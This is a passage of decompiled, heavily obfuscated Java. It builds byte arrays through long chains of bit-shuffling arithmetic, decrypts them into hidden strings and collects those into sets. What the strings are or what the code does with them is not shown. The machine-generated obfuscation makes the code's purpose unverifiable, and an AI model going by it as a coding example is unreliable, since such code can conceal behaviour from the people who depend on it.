                    bArr14[4] = 1888863531 ^ S.a(0, -1, 536887311, 1351976272);
                    bArr14[5] = -72;
                    bArr14[6] = -63;
                    bArr14[7] = 35;
                    bArr14[8] = -121;
                    bArr14[9] = Byte.MAX_VALUE;
                    long j792 = 71565906;
                    long j793 = ((((((((j792 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j792 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j792 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j792 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j521;
                    long j794 = (j793 >>> 48) & 43690;
                    long j795 = ((j794 >>> 2) | (j794 >>> 1)) & 858993459;
                    long j796 = ((j795 >>> 2) | j795) & 252645135;
                    long j797 = (j793 >>> 32) & 43690;
                    long j798 = ((j797 >>> 2) | (j797 >>> 1)) & 858993459;
                    long j799 = ((j798 >>> 2) | j798) & 252645135;
                    long j800 = ((((j799 >>> 4) | j799) & 16711935) << 16) | ((((j796 >>> 4) | j796) & 16711935) << 24);
                    long j801 = (j793 >>> 16) & 43690;
                    long j802 = ((j801 >>> 2) | (j801 >>> 1)) & 858993459;
                    long j803 = ((j802 >>> 2) | j802) & 252645135;
                    long j804 = j793 & 43690;
                    long j805 = ((j804 >>> 2) | (j804 >>> 1)) & 858993459;
                    long j806 = ((j805 >>> 2) | j805) & 252645135;
                    bArr14[10] = (-193599702) ^ ((-1542339774) + (((int) ((((j806 >>> 4) | j806) & 16711935) | (((((j803 >>> 4) | j803) & 16711935) << 8) | j800))) | 1348740112));
                    bArr14[11] = -32;
                    bArr14[12] = 109;
                    bArr14[13] = 64;
                    bArr14[14] = 93;
                    bArr14[15] = -3;
                    bArr14[16] = -44;
                    bArr14[17] = -6;
                    long j807 = 975905208;
                    long j808 = (((((((((j807 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j807 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j807 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j807 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j597;
                    long j809 = (j808 >>> 48) & 43690;
                    long j810 = ((j809 >>> 2) | (j809 >>> 1)) & 858993459;
                    long j811 = ((j810 >>> 2) | j810) & 252645135;
                    long j812 = (j808 >>> 32) & 43690;
                    long j813 = ((j812 >>> 2) | (j812 >>> 1)) & 858993459;
                    long j814 = ((j813 >>> 2) | j813) & 252645135;
                    long j815 = ((((j814 >>> 4) | j814) & 16711935) << 16) + ((((j811 >>> 4) | j811) & 16711935) << 24);
                    long j816 = (j808 >>> 16) & 43690;
                    long j817 = ((j816 >>> 2) | (j816 >>> 1)) & 858993459;
                    long j818 = ((j817 >>> 2) | j817) & 252645135;
                    long j819 = j808 & 43690;
                    long j820 = ((j819 >>> 2) | (j819 >>> 1)) & 858993459;
                    long j821 = ((j820 >>> 2) | j820) & 252645135;
                    bArr14[18] = (((int) ((((j821 >>> 4) | j821) & 16711935) + (((((j818 >>> 4) | j818) & 16711935) << 8) | j815))) + 9732161) ^ (-985637260);
                    bArr14[19] = 0;
                    bArr14[20] = 105;
                    bArr14[21] = -24;
                    bArr14[22] = -82;
                    bArr14[23] = 16;
                    bArr14[24] = -104;
                    bArr14[25] = 24;
                    bArr14[26] = 33;
                    bArr14[27] = 83;
                    bArr14[28] = 66;
                    bArr14[29] = 41;
                    bArr14[30] = 42;
                    bArr14[31] = 65;
                    long j822 = -2075901244;
                    long j823 = ((((((((j822 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j822 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j822 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j822 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j553;
                    long j824 = (j823 >>> 48) & 43690;
                    long j825 = ((j824 >>> 2) | (j824 >>> 1)) & 858993459;
                    long j826 = ((j825 >>> 2) | j825) & 252645135;
                    long j827 = (j823 >>> 32) & 43690;
                    long j828 = ((j827 >>> 2) | (j827 >>> 1)) & 858993459;
                    long j829 = ((j828 >>> 2) | j828) & 252645135;
                    long j830 = ((((j829 >>> 4) | j829) & 16711935) << 16) | ((((j826 >>> 4) | j826) & 16711935) << 24);
                    long j831 = (j823 >>> 16) & 43690;
                    long j832 = ((j831 >>> 2) | (j831 >>> 1)) & 858993459;
                    long j833 = ((j832 >>> 2) | j832) & 252645135;
                    long j834 = j823 & 43690;
                    long j835 = ((j834 >>> 2) | (j834 >>> 1)) & 858993459;
                    long j836 = ((j835 >>> 2) | j835) & 252645135;
                    byte[] bArr15 = new byte[(((int) ((((j836 >>> 4) | j836) & 16711935) | (((((j833 >>> 4) | j833) & 16711935) << 8) | j830))) + 142802960) ^ (-1933098252)];
                    bArr15[0] = 97;
                    bArr15[1] = 5;
                    bArr15[2] = -38;
                    bArr15[3] = -112;
                    bArr15[4] = 26;
                    bArr15[5] = -47;
                    bArr15[6] = -91;
                    bArr15[7] = 13;
                    bArr15[8] = -9;
                    bArr15[9] = 26;
                    bArr15[10] = 10;
                    bArr15[11] = -115;
                    bArr15[12] = 4;
                    bArr15[13] = 51;
                    bArr15[14] = 46;
                    bArr15[15] = -108;
                    bArr15[16] = -69;
                    bArr15[17] = -108;
                    bArr15[18] = -93;
                    bArr15[19] = 85;
                    bArr15[20] = 58;
                    bArr15[21] = -83;
                    bArr15[22] = -15;
                    bArr15[23] = 82;
                    bArr15[24] = -47;
                    bArr15[25] = 87;
                    bArr15[26] = 108;
                    bArr15[27] = 22;
                    bArr15[28] = 22;
                    bArr15[29] = 123;
                    bArr15[30] = 99;
                    bArr15[31] = 2;
                    x(bArr14, bArr15);
                    strArr2[2] = new String(bArr14, charset).intern();
                    strArr2[3] = intern3;
                    strArr2[4] = intern4;
                    strArr2[5] = intern5;
                    byte[] bArr16 = new byte[34];
                    bArr16[0] = -90;
                    bArr16[1] = 92;
                    bArr16[2] = -91;
                    bArr16[3] = 103;
                    bArr16[4] = 48;
                    bArr16[5] = 126;
                    bArr16[6] = -58;
                    bArr16[7] = 72;
                    bArr16[8] = 122;
                    bArr16[9] = 10;
                    long j837 = -879451334;
                    long j838 = (((((((((j837 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j837 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j837 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j837 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j319 + 6148914691236517205L;
                    long j839 = (j838 >>> 48) & 43690;
                    long j840 = ((j839 >>> 2) | (j839 >>> 1)) & 858993459;
                    long j841 = ((j840 >>> 2) | j840) & 252645135;
                    long j842 = (j838 >>> 32) & 43690;
                    long j843 = ((j842 >>> 2) | (j842 >>> 1)) & 858993459;
                    long j844 = ((j843 >>> 2) | j843) & 252645135;
                    long j845 = ((((j844 >>> 4) | j844) & 16711935) << 16) + ((((j841 >>> 4) | j841) & 16711935) << 24);
                    long j846 = (j838 >>> 16) & 43690;
                    long j847 = ((j846 >>> 2) | (j846 >>> 1)) & 858993459;
                    long j848 = ((j847 >>> 2) | j847) & 252645135;
                    long j849 = j838 & 43690;
                    long j850 = ((j849 >>> 2) | (j849 >>> 1)) & 858993459;
                    long j851 = ((j850 >>> 2) | j850) & 252645135;
                    bArr16[((((int) ((((j851 >>> 4) | j851) & 16711935) | (((((j848 >>> 4) | j848) & 16711935) << 8) | j845))) & (-1876388587)) + 50593928) ^ (-1825794665)] = 73;
                    bArr16[11] = -75;
                    bArr16[12] = 100;
                    bArr16[13] = Byte.MAX_VALUE;
                    bArr16[14] = -118;
                    bArr16[15] = -57;
                    bArr16[16] = -9;
                    bArr16[17] = -88;
                    bArr16[18] = 126;
                    bArr16[19] = -77;
                    bArr16[20] = -127;
                    bArr16[21] = 11;
                    bArr16[22] = -94;
                    bArr16[23] = -109;
                    bArr16[24] = 52;
                    bArr16[25] = 47;
                    bArr16[26] = -12;
                    long j852 = j597 + j318;
                    long j853 = (j852 >>> 48) & 21845;
                    long j854 = ((j853 >>> 1) | j853) & 858993459;
                    long j855 = ((j854 >>> 2) | j854) & 252645135;
                    long j856 = (j852 >>> 32) & 21845;
                    long j857 = ((j856 >>> 1) | j856) & 858993459;
                    long j858 = ((j857 >>> 2) | j857) & 252645135;
                    long j859 = ((((j858 >>> 4) | j858) & 16711935) << 16) + ((((j855 >>> 4) | j855) & 16711935) << 24);
                    long j860 = (j852 >>> 16) & 21845;
                    long j861 = ((j860 >>> 1) | j860) & 858993459;
                    long j862 = ((j861 >>> 2) | j861) & 252645135;
                    long j863 = j852 & 21845;
                    long j864 = ((j863 >>> 1) | j863) & 858993459;
                    long j865 = ((j864 >>> 2) | j864) & 252645135;
                    int i24 = (((int) ((((j865 >>> 4) | j865) & 16711935) + (((((j862 >>> 4) | j862) & 16711935) << 8) | j859))) | 1327787253) & (-504970623);
                    long j866 = 101789728;
                    long b13 = c3.b((((((((j866 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j866 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j866 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j866 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), j195, 6148914691236517205L);
                    long j867 = (b13 >>> 48) & 43690;
                    long j868 = ((j867 >>> 2) | (j867 >>> 1)) & 858993459;
                    long j869 = ((j868 >>> 2) | j868) & 252645135;
                    long j870 = (b13 >>> 32) & 43690;
                    long j871 = ((j870 >>> 2) | (j870 >>> 1)) & 858993459;
                    long j872 = ((j871 >>> 2) | j871) & 252645135;
                    long j873 = ((((j872 >>> 4) | j872) & 16711935) << 16) + ((((j869 >>> 4) | j869) & 16711935) << 24);
                    long j874 = (b13 >>> 16) & 43690;
                    long j875 = ((j874 >>> 2) | (j874 >>> 1)) & 858993459;
                    long j876 = ((j875 >>> 2) | j875) & 252645135;
                    long j877 = b13 & 43690;
                    long j878 = ((j877 >>> 2) | (j877 >>> 1)) & 858993459;
                    long j879 = ((j878 >>> 2) | j878) & 252645135;
                    int i25 = i24 + ((int) ((((j879 >>> 4) | j879) & 16711935) + ((((j876 >>> 4) | j876) & 16711935) << 8) + j873));
                    long j880 = -403180841;
                    long j881 = i25;
                    long j882 = (((((((((j880 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j880 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j880 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j880 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + ((((((((j881 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j881 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j881 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j881 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j883 = (j882 >>> 48) & 21845;
                    long j884 = ((j883 >>> 1) | j883) & 858993459;
                    long j885 = ((j884 >>> 2) | j884) & 252645135;
                    long j886 = (j882 >>> 32) & 21845;
                    long j887 = ((j886 >>> 1) | j886) & 858993459;
                    long j888 = ((j887 >>> 2) | j887) & 252645135;
                    long j889 = ((((j888 >>> 4) | j888) & 16711935) << 16) + ((((j885 >>> 4) | j885) & 16711935) << 24);
                    long j890 = (j882 >>> 16) & 21845;
                    long j891 = ((j890 >>> 1) | j890) & 858993459;
                    long j892 = ((j891 >>> 2) | j891) & 252645135;
                    long j893 = j882 & 21845;
                    long j894 = ((j893 >>> 1) | j893) & 858993459;
                    long j895 = ((j894 >>> 2) | j894) & 252645135;
                    bArr16[27] = (int) ((((((j892 >>> 4) | j892) & 16711935) << 8) + j889) | (((j895 >>> 4) | j895) & 16711935));
                    bArr16[28] = -79;
                    bArr16[29] = 66;
                    bArr16[30] = -125;
                    bArr16[31] = 65;
                    bArr16[32] = -75;
                    bArr16[33] = -67;
                    long j896 = -1874325486;
                    long j897 = (((((((((j896 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j896 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j896 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j896 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j521 + 6148914691236517205L;
                    long j898 = (j897 >>> 48) & 43690;
                    long j899 = ((j898 >>> 2) | (j898 >>> 1)) & 858993459;
                    long j900 = ((j899 >>> 2) | j899) & 252645135;
                    long j901 = (j897 >>> 32) & 43690;
                    long j902 = ((j901 >>> 2) | (j901 >>> 1)) & 858993459;
                    long j903 = ((j902 >>> 2) | j902) & 252645135;
                    long j904 = ((((j903 >>> 4) | j903) & 16711935) << 16) | ((((j900 >>> 4) | j900) & 16711935) << 24);
                    long j905 = (j897 >>> 16) & 43690;
                    long j906 = ((j905 >>> 2) | (j905 >>> 1)) & 858993459;
                    long j907 = ((j906 >>> 2) | j906) & 252645135;
                    long j908 = j897 & 43690;
                    long j909 = ((j908 >>> 2) | (j908 >>> 1)) & 858993459;
                    long j910 = (j909 | (j909 >>> 2)) & 252645135;
                    int i26 = (int) (((j910 | (j910 >>> 4)) & 16711935) + ((((j907 >>> 4) | j907) & 16711935) << 8) + j904);
                    x(bArr16, new byte[]{-57, 50, -63, 21, 95, 23, -94, 102, 10, 111, 59, -40, 13, (-797419754) ^ ((i26 & 1076905736) + (i26 | 1076905736)), -7, -82, -104, -58, 80, -26, -46, 78, -3, -43, 125, 97, -77, 51, -29, 18, -47, 8, -5, -23});
                    strArr2[6] = new String(bArr16, charset).intern();
                    strArr2[7] = intern7;
                    strArr2[8] = intern8;
                    HashSet hashSet = new HashSet(Arrays.asList(strArr2));
                    byte[] bArr17 = {-62, -117, -124, 40, -59, -28, -15, 23, -72, -31, -64, 121, -42, -76, 44, -97, 19, -105, 2, 32, -114, -120, -52, 51, -32, 115, 60, -33, 65, 50, -59, -53, 22, 73, -110, -84, -68, 37, -33, -52, -76, 44, -92, 108, -44, -119, 68};
                    byte[] bArr18 = new byte[47];
                    bArr18[0] = -93;
                    bArr18[1] = -27;
                    bArr18[2] = -32;
                    bArr18[3] = 90;
                    bArr18[4] = -86;
                    bArr18[5] = -115;
                    bArr18[6] = -107;
                    bArr18[B0.a(-4, 1)] = 57;
                    bArr18[8] = -56;
                    bArr18[9] = -124;
                    bArr18[10] = -78;
                    bArr18[11] = 20;
                    bArr18[12] = -65;
                    bArr18[13] = -57;
                    long j911 = -526048931;
                    long j912 = -526049022;
                    long j913 = (((((((((j911 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j911 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j911 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j911 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j912 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j912 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j912 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j912 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j914 = (j913 >>> 48) & 21845;
                    long j915 = ((j914 >>> 1) | j914) & 858993459;
                    long j916 = ((j915 >>> 2) | j915) & 252645135;
                    long j917 = (j913 >>> 32) & 21845;
                    long j918 = ((j917 >>> 1) | j917) & 858993459;
                    long j919 = ((j918 >>> 2) | j918) & 252645135;
                    long j920 = ((((j919 >>> 4) | j919) & 16711935) << 16) + ((((j916 >>> 4) | j916) & 16711935) << 24);
                    long j921 = (j913 >>> 16) & 21845;
                    long j922 = ((j921 >>> 1) | j921) & 858993459;
                    long j923 = ((j922 >>> 2) | j922) & 252645135;
                    long j924 = j913 & 21845;
                    long j925 = ((j924 >>> 1) | j924) & 858993459;
                    long j926 = ((j925 >>> 2) | j925) & 252645135;
                    bArr18[14] = (int) ((((j926 >>> 4) | j926) & 16711935) + ((((j923 >>> 4) | j923) & 16711935) << 8) + j920);
                    bArr18[15] = -10;
                    bArr18[16] = 124;
                    bArr18[17] = -7;
                    bArr18[18] = 44;
                    bArr18[19] = 102;
                    bArr18[20] = -63;
                    bArr18[21] = -38;
                    bArr18[22] = -119;
                    bArr18[23] = 116;
                    bArr18[24] = -78;
                    bArr18[25] = 60;
                    bArr18[26] = 105;
                    bArr18[27] = -111;
                    bArr18[28] = 5;
                    bArr18[29] = 109;
                    bArr18[30] = -106;
                    bArr18[31] = -114;
                    bArr18[32] = 68;
                    bArr18[33] = 31;
                    bArr18[34] = -37;
                    bArr18[35] = -17;
                    bArr18[36] = -7;
                    bArr18[37] = 122;
                    bArr18[38] = -101;
                    bArr18[39] = -115;
                    bArr18[40] = -32;
                    bArr18[41] = 109;
                    bArr18[42] = -5;
                    bArr18[43] = 63;
                    bArr18[44] = -115;
                    bArr18[45] = -57;
                    bArr18[46] = 7;
                    x(bArr17, bArr18);
                    HashSet hashSet2 = new HashSet(Arrays.asList(intern, intern2, new String(bArr17, charset).intern(), intern3, intern4, intern5, intern6, intern7, intern8));
                    byte[] bArr19 = new byte[42];
                    bArr19[0] = 82;
                    bArr19[1] = 76;
                    bArr19[2] = 26;
                    bArr19[3] = 99;
                    bArr19[4] = -44;
                    bArr19[5] = -15;
                    bArr19[6] = -96;
                    bArr19[7] = 30;
                    bArr19[8] = 60;
                    long j927 = j731 + j100;
                    long j928 = (j927 >>> 48) & 21845;
                    long j929 = ((j928 >>> 1) | j928) & 858993459;
                    long j930 = ((j929 >>> 2) | j929) & 252645135;
                    long j931 = (j927 >>> 32) & 21845;
                    long j932 = ((j931 >>> 1) | j931) & 858993459;
                    long j933 = ((j932 >>> 2) | j932) & 252645135;
                    long j934 = ((((j933 >>> 4) | j933) & 16711935) << 16) + ((((j930 >>> 4) | j930) & 16711935) << 24);
                    long j935 = (j927 >>> 16) & 21845;
                    long j936 = ((j935 >>> 1) | j935) & 858993459;
                    long j937 = ((j936 >>> 2) | j936) & 252645135;
                    long j938 = ((((j937 >>> 4) | j937) & 16711935) << 8) + j934;
                    long j939 = j927 & 21845;
                    long j940 = ((j939 >>> 1) | j939) & 858993459;
                    long j941 = ((j940 >>> 2) | j940) & 252645135;
                    int i27 = (((((int) ((((j941 >>> 4) | j941) & 16711935) | j938)) | (-165786112)) & 1409571027) + 18915592) ^ 1428486610;
                    long j942 = j116 + j731;
                    long j943 = (j942 >>> 48) & 21845;
                    long j944 = ((j943 >>> 1) | j943) & 858993459;
                    long j945 = ((j944 >>> 2) | j944) & 252645135;
                    long j946 = (j942 >>> 32) & 21845;
                    long j947 = ((j946 >>> 1) | j946) & 858993459;
                    long j948 = ((j947 >>> 2) | j947) & 252645135;
                    long j949 = ((((j948 >>> 4) | j948) & 16711935) << 16) | ((((j945 >>> 4) | j945) & 16711935) << 24);
                    long j950 = (j942 >>> 16) & 21845;
                    long j951 = ((j950 >>> 1) | j950) & 858993459;
                    long j952 = ((j951 >>> 2) | j951) & 252645135;
                    long j953 = ((((j952 >>> 4) | j952) & 16711935) << 8) + j949;
                    long j954 = j942 & 21845;
                    long j955 = ((j954 >>> 1) | j954) & 858993459;
                    long j956 = ((j955 >>> 2) | j955) & 252645135;
                    bArr19[i27] = (((((int) ((((j956 >>> 4) | j956) & 16711935) + j953)) | 361084901) & (-1407135738)) + 1074399296) ^ 332736460;
                    bArr19[10] = 46;
                    bArr19[11] = 23;
                    bArr19[12] = 60;
                    bArr19[13] = 49;
                    bArr19[14] = 0;
                    bArr19[15] = 74;
                    bArr19[16] = 40;
                    bArr19[17] = -64;
                    bArr19[18] = -53;
                    bArr19[19] = 51;
                    bArr19[20] = 92;
                    bArr19[21] = 23;
                    bArr19[22] = 55;
                    bArr19[23] = -112;
                    bArr19[24] = -27;
                    bArr19[25] = -107;
                    bArr19[26] = 25;
                    long j957 = 1171502804;
                    long b14 = c3.b((((((((j957 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j957 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j957 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j957 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), j319, 6148914691236517205L);
                    long j958 = (b14 >>> 48) & 43690;
                    long j959 = ((j958 >>> 2) | (j958 >>> 1)) & 858993459;
                    long j960 = ((j959 >>> 2) | j959) & 252645135;
                    long j961 = (b14 >>> 32) & 43690;
                    long j962 = ((j961 >>> 2) | (j961 >>> 1)) & 858993459;
                    long j963 = ((j962 >>> 2) | j962) & 252645135;
                    long j964 = ((((j963 >>> 4) | j963) & 16711935) << 16) + ((((j960 >>> 4) | j960) & 16711935) << 24);
                    long j965 = (b14 >>> 16) & 43690;
                    long j966 = ((j965 >>> 2) | (j965 >>> 1)) & 858993459;
                    long j967 = ((j966 >>> 2) | j966) & 252645135;
                    long j968 = b14 & 43690;
                    long j969 = ((j968 >>> 2) | (j968 >>> 1)) & 858993459;
                    long j970 = ((j969 >>> 2) | j969) & 252645135;
                    int i28 = 344002752 + (((int) ((((j970 >>> 4) | j970) & 16711935) + ((((j967 >>> 4) | j967) & 16711935) << 8) + j964)) & (-2146294215));
                    bArr19[27] = ((i28 & (-1802291486)) * 2) + (1802291485 - i28);
                    long j971 = 1124073793;
                    long j972 = ((((((((j971 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j971 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j971 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j971 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j553;
                    long j973 = (j972 >>> 48) & 43690;
                    long j974 = ((j973 >>> 2) | (j973 >>> 1)) & 858993459;
                    long j975 = ((j974 >>> 2) | j974) & 252645135;
                    long j976 = (j972 >>> 32) & 43690;
                    long j977 = ((j976 >>> 2) | (j976 >>> 1)) & 858993459;
                    long j978 = ((j977 >>> 2) | j977) & 252645135;
                    long j979 = ((((j978 >>> 4) | j978) & 16711935) << 16) + ((((j975 >>> 4) | j975) & 16711935) << 24);
                    long j980 = (j972 >>> 16) & 43690;
                    long j981 = ((j980 >>> 2) | (j980 >>> 1)) & 858993459;
                    long j982 = ((j981 >>> 2) | j981) & 252645135;
                    long j983 = j972 & 43690;
                    long j984 = ((j983 >>> 2) | (j983 >>> 1)) & 858993459;
                    long j985 = ((j984 >>> 2) | j984) & 252645135;
                    int i29 = (int) ((((j985 >>> 4) | j985) & 16711935) | ((((j982 >>> 4) | j982) & 16711935) << 8) | j979);
                    long j986 = -2113305600;
                    long j987 = ((((((((j986 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j986 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j986 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j986 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + j318;
                    long j988 = (j987 >>> 48) & 43690;
                    long j989 = ((j988 >>> 2) | (j988 >>> 1)) & 858993459;
                    long j990 = ((j989 >>> 2) | j989) & 252645135;
                    long j991 = (j987 >>> 32) & 43690;
                    long j992 = ((j991 >>> 2) | (j991 >>> 1)) & 858993459;
                    long j993 = ((j992 >>> 2) | j992) & 252645135;
                    long j994 = ((((j993 >>> 4) | j993) & 16711935) << 16) + ((((j990 >>> 4) | j990) & 16711935) << 24);
                    long j995 = (j987 >>> 16) & 43690;
                    long j996 = ((j995 >>> 2) | (j995 >>> 1)) & 858993459;
                    long j997 = ((j996 >>> 2) | j996) & 252645135;
                    long j998 = j987 & 43690;
                    long j999 = ((j998 >>> 2) | (j998 >>> 1)) & 858993459;
                    long j1000 = ((j999 >>> 2) | j999) & 252645135;
                    bArr19[(i29 + (((int) ((((j1000 >>> 4) | j1000) & 16711935) + (((((j997 >>> 4) | j997) & 16711935) << 8) | j994))) | (-2146851840))) ^ (-1022778019)] = -94;
                    bArr19[29] = -19;
                    bArr19[30] = -103;
                    bArr19[31] = 70;
                    bArr19[32] = 110;
                    bArr19[33] = 105;
                    bArr19[34] = 122;
                    bArr19[35] = -58;
                    bArr19[36] = 126;
                    bArr19[37] = 101;
                    bArr19[38] = -37;
                    bArr19[39] = 56;
                    bArr19[40] = -58;
                    bArr19[41] = 95;
                    long j1001 = 287588898;
                    long j1002 = (((((((((j1001 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j1001 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j1001 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j1001 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + j597;
                    long j1003 = (j1002 >>> 48) & 43690;
                    long j1004 = ((j1003 >>> 2) | (j1003 >>> 1)) & 858993459;
                    long j1005 = ((j1004 >>> 2) | j1004) & 252645135;
                    long j1006 = (j1002 >>> 32) & 43690;
                    long j1007 = ((j1006 >>> 2) | (j1006 >>> 1)) & 858993459;
                    long j1008 = ((j1007 >>> 2) | j1007) & 252645135;
                    long j1009 = ((((j1008 >>> 4) | j1008) & 16711935) << 16) + ((((j1005 >>> 4) | j1005) & 16711935) << 24);
                    long j1010 = (j1002 >>> 16) & 43690;
                    long j1011 = ((j1010 >>> 2) | (j1010 >>> 1)) & 858993459;
                    long j1012 = ((j1011 >>> 2) | j1011) & 252645135;
                    long j1013 = j1002 & 43690;
                    long j1014 = ((j1013 >>> 2) | (j1013 >>> 1)) & 858993459;
                    long j1015 = ((j1014 >>> 2) | j1014) & 252645135;
                    int i30 = (int) ((((j1015 >>> 4) | j1015) & 16711935) | (((((j1012 >>> 4) | j1012) & 16711935) << 8) + j1009));
                    long j1016 = 268469345;
                    long j1017 = (((((((((j1016 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j1016 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j1016 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j1016 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j731;
                    long j1018 = (j1017 >>> 48) & 43690;
                    long j1019 = ((j1018 >>> 2) | (j1018 >>> 1)) & 858993459;
                    long j1020 = ((j1019 >>> 2) | j1019) & 252645135;
                    long j1021 = (j1017 >>> 32) & 43690;
                    long j1022 = ((j1021 >>> 2) | (j1021 >>> 1)) & 858993459;
                    long j1023 = ((j1022 >>> 2) | j1022) & 252645135;
